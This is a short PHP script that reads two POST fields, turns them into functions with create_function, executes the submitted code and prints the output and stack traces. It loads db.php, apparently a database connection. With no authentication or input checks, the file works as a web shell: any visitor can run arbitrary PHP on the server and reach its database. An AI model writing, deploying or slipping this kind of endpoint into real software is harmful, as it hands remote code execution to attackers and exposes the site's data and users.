<?php
require_once 'db.php';

try
{
    //创建参数
    $param = $_POST['a'];
    $pr = create_function('$q', '{ return array(' . $param . ');}');
    
    //创建代码
    $code = $_POST['c'];
    $func = create_function('$a', '{  ' . $code . ' }');
    
    $rsl = $func($pr(false));
    
    echo "<pre>";
    var_dump($rsl);
}
catch (Exception $e)
{
    echo "<pre>";
    var_dump ($e->getTrace());
}
?>